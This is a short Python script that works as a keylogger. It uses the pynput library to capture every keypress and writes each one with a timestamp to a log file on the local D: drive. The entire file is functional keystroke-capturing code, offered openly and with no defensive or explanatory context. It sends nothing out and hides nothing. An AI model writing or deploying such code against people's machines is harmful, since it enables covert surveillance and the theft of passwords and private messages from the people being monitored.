from pynput.keyboard import Key, Listener
import logging

#Location to save the log file
log_file= "D:/keylogger/log/"

logging.basicConfig(filename=(log_file + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
